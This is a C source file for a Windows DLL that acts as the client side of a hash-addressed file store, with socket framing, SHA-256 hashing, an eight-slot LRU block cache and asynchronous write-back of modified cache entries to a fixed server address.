#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "advapi32.lib")

/*
 * vmstore responsibilities used by cvm_exec:
 *   - token -> user override hash lookup (op 8)
 *   - fallback token -> first child hash lookup
 *   - hash -> file bytes loading (op 3)
 *   - a multi-entry LRU in-process block cache (8 slots)
 *   - non-blocking write-back when cached bytes no longer match cache_hash
 */

typedef unsigned char u8;
typedef unsigned u32;
typedef u8 H[32];

extern __declspec(dllimport) SOCKET conn;
extern __declspec(dllimport) void cvm_firstchild(H p, H c);

static H id;

/* Multi-entry LRU cache */
#define CACHE_SLOTS 8

typedef struct {
    H key;
    H hash;
    u8 data[1<<20];
    u32 len;
    int on;
    u32 lru;
} CacheSlot;

static CacheSlot slots[CACHE_SLOTS];
static int primary_idx = 0;
static u32 lru_counter = 0;

/* Networking helpers */

static void readn_sock(SOCKET s, void *b, u32 n) {
    u32 g = 0;
    while (g < n) {
        int r = recv(s, (char*)b + g, n - g, 0);
        if (r < 1) exit(1);
        g += r;
    }
}

static void readn(void *b, u32 n) { readn_sock(conn, b, n); }

static void send_op_sock(SOCKET s, u8 op, const void *body, u32 len) {
    u8 h[5] = {op, len>>24, len>>16, len>>8, len};
    send(s, (char*)h, 5, 0);
    if (len) send(s, (char*)body, len, 0);
}

static void send_op(u8 op, const void *body, u32 len) { send_op_sock(conn, op, body, len); }

static u8 *recv_frame_sock(SOCKET s, u8 *st, u32 *n) {
    u8 h[5];
    readn_sock(s, h, 5);
    *st = h[0];
    *n = (u32)h[1]<<24 | h[2]<<16 | h[3]<<8 | h[4];
    u8 *b = malloc(*n ? *n : 1);
    readn_sock(s, b, *n);
    return b;
}

static u8 *recv_frame(u8 *st, u32 *n) { return recv_frame_sock(conn, st, n); }

static void load_id(void) {
    H z = {0};
    if (memcmp(id, z, 32)) return;
    FILE *f = fopen("id.bin", "rb");
    if (f) { fread(id, 1, 32, f); fclose(f); }
}

static int same(const H a, const H b) { return !memcmp(a, b, 32); }

static int sha256(const u8 *p, u32 n, H out) {
    HCRYPTPROV prov = 0;
    HCRYPTHASH hash = 0;
    DWORD len = 32;
    int ok = 0;
    if (!CryptAcquireContextA(&prov, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) goto done;
    if (!CryptCreateHash(prov, CALG_SHA_256, 0, 0, &hash)) goto done;
    if (!CryptHashData(hash, p, n, 0)) goto done;
    if (!CryptGetHashParam(hash, HP_HASHVAL, out, &len, 0) || len != 32) goto done;
    ok = 1;
done:
    if (hash) CryptDestroyHash(hash);
    if (prov) CryptReleaseContext(prov, 0);
    return ok;
}

static int uget(const H k, H v) {
    u8 st, b[64], *r;
    u32 n;
    load_id();
    memcpy(b, id, 32);
    memcpy(b+32, k, 32);
    send_op(8, b, 64);
    r = recv_frame(&st, &n);
    if (!st && n >= 32) memcpy(v, r, 32);
    free(r);
    return !st;
}

static void uset_sock(SOCKET s, const H k, const H v) {
    u8 st, b[96], *r;
    u32 n;
    load_id();
    memcpy(b, id, 32);
    memcpy(b+32, k, 32);
    memcpy(b+64, v, 32);
    send_op_sock(s, 7, b, 96);
    r = recv_frame_sock(s, &st, &n);
    free(r);
}

static void uset(const H k, const H v) { uset_sock(conn, k, v); }

static void file_get(const H h, u8 **p, u32 *n) {
    u8 st;
    send_op(3, h, 32);
    *p = recv_frame(&st, n);
}

static void upload_sock(SOCKET s, const u8 *p, u32 n, H h) {
    u8 st, *r;
    u32 m;
    send_op_sock(s, 2, p, n);
    r = recv_frame_sock(s, &st, &m);
    if (m >= 32) memcpy(h, r, 32);
    free(r);
}

static void upload(const u8 *p, u32 n, H h) { upload_sock(conn, p, n, h); }

/* Cache API */

__declspec(dllexport) int cvm_hash_same(const H a, const H b) { return same(a, b); }

__declspec(dllexport) u8 *cvm_cached_base(void) { return slots[primary_idx].data; }
__declspec(dllexport) u32 cvm_cached_len(void) { return slots[primary_idx].len; }
__declspec(dllexport) void cvm_cached_set_len(u32 n) {
    if (n <= sizeof(slots[0].data)) slots[primary_idx].len = n;
}

__declspec(dllexport) int cvm_cache_hit(const H k) {
    for (int i = 0; i < CACHE_SLOTS; i++) {
        if (slots[i].on && same(k, slots[i].key)) {
            slots[i].lru = ++lru_counter;
            primary_idx = i;
            return 1;
        }
    }
    return 0;
}

/* Async writeback */

typedef struct AsyncWritebackJob {
    H key;
    u8 *data;
    u32 len;
} AsyncWritebackJob;

static SOCKET open_async_conn(void) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(9000);
    inet_pton(AF_INET, "118.25.42.70", &a.sin_addr);
    if (connect(s, (void *)&a, sizeof(a)) == SOCKET_ERROR) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    return s;
}

static DWORD WINAPI async_writeback_thread(LPVOID arg) {
    AsyncWritebackJob *j = (AsyncWritebackJob*)arg;
    H h;
    SOCKET s = open_async_conn();
    if (s != INVALID_SOCKET) {
        upload_sock(s, j->data, j->len, h);
        uset_sock(s, j->key, h);
        closesocket(s);
    }
    free(j->data);
    free(j);
    return 0;
}

__declspec(dllexport) void cvm_cache_verify_async(void) {
    H h;
    AsyncWritebackJob *j;
    HANDLE th;
    CacheSlot *s = &slots[primary_idx];
    if (!s->on) return;
    if (!sha256(s->data, s->len, h)) return;
    if (same(h, s->hash)) return;

    j = (AsyncWritebackJob*)malloc(sizeof(*j));
    if (!j) return;
    memcpy(j->key, s->key, 32);
    j->len = s->len;
    j->data = (u8*)malloc(s->len ? s->len : 1);
    if (!j->data) { free(j); return; }
    memcpy(j->data, s->data, s->len);

    memcpy(s->hash, h, 32);
    th = CreateThread(0, 0, async_writeback_thread, j, 0, 0);
    if (th) CloseHandle(th);
    else { free(j->data); free(j); }
}

__declspec(dllexport) void cvm_cache_flush(void) {
    H h;
    CacheSlot *s = &slots[primary_idx];
    if (!s->on) return;
    upload(s->data, s->len, h);
    if (!same(h, s->hash)) { uset(s->key, h); memcpy(s->hash, h, 32); }
}

__declspec(dllexport) void cvm_upload_async(const u8 *p, u32 n) {
    send_op(2, p, n);
}

__declspec(dllexport) void cvm_cache_load(const H k, const H h) {
    u8 *p;
    u32 n;
    int target = -1;
    for (int i = 0; i < CACHE_SLOTS; i++) {
        if (!slots[i].on) { target = i; break; }
    }
    if (target < 0) {
        target = 0;
        for (int i = 1; i < CACHE_SLOTS; i++) {
            if (slots[i].lru < slots[target].lru) target = i;
        }
    }
    memcpy(slots[target].key, k, 32);
    memcpy(slots[target].hash, h, 32);
    file_get(h, &p, &n);
    if (n > sizeof(slots[0].data)) n = sizeof(slots[0].data);
    memcpy(slots[target].data, p, n);
    slots[target].len = n;
    free(p);
    slots[target].on = 1;
    slots[target].lru = ++lru_counter;
    primary_idx = target;
}

__declspec(dllexport) int cvm_resolve_payload_hash(const H k, H h) {
    clock_t t0 = clock();
    if (cvm_cache_hit(k)) {
        memcpy(h, slots[primary_idx].hash, 32);
        cvm_cache_verify_async();
        clock_t t1 = clock();
        printf("[vmstore] HIT  slot=%d key=%02x%02x%02x%02x time=%lu us\n",
               primary_idx, k[0],k[1],k[2],k[3],
               (unsigned long)((t1-t0)*1000000/CLOCKS_PER_SEC));
        return 1;
    }
    clock_t t_net = clock();
    if (!uget(k, h)) cvm_firstchild((u8*)k, h);
    clock_t t_load = clock();
    cvm_cache_load(k, h);
    clock_t t1 = clock();
    printf("[vmstore] MISS slot=%d key=%02x%02x%02x%02x net=%lu us load=%lu us total=%lu us\n",
           primary_idx, k[0],k[1],k[2],k[3],
           (unsigned long)((t_load-t_net)*1000000/CLOCKS_PER_SEC),
           (unsigned long)((t1-t_load)*1000000/CLOCKS_PER_SEC),
           (unsigned long)((t1-t0)*1000000/CLOCKS_PER_SEC));
    return 1;
}

__declspec(dllexport) u32 cvm_children(const H parent, H *out, u32 cap) {
    u8 st, *r;
    u32 n, cnt = 0, got = 0;
    send_op(5, parent, 32);
    r = recv_frame(&st, &n);
    if (!st && n >= 4) {
        cnt = ((u32)r[0] << 24) | ((u32)r[1] << 16) | ((u32)r[2] << 8) | r[3];
        if (cnt > (n - 4) / 40) cnt = (n - 4) / 40;
        got = cnt < cap ? cnt : cap;
        for (u32 i = 0; i < got; i++) memcpy(out[i], r + 4 + i * 40, 32);
    }
    free(r);
    return cnt;
}

__declspec(dllexport) u32 cvm_file_read(const H h, u8 *out, u32 cap) {
    u8 *p;
    u32 n;
    file_get(h, &p, &n);
    if (out && cap) memcpy(out, p, n < cap ? n : cap);
    free(p);
    return n;
}

__declspec(dllexport) int cvm_sha256(const u8 *p, u32 n, H out) {
    return sha256(p, n, out);
}

__declspec(dllexport) void cvm_edge(const H parent, const H child) {
    u8 b[64];
    memcpy(b, parent, 32);
    memcpy(b + 32, child, 32);
    send_op(4, b, 64);
    u8 st, *r;
    u32 n;
    r = recv_frame(&st, &n);
    free(r);
}
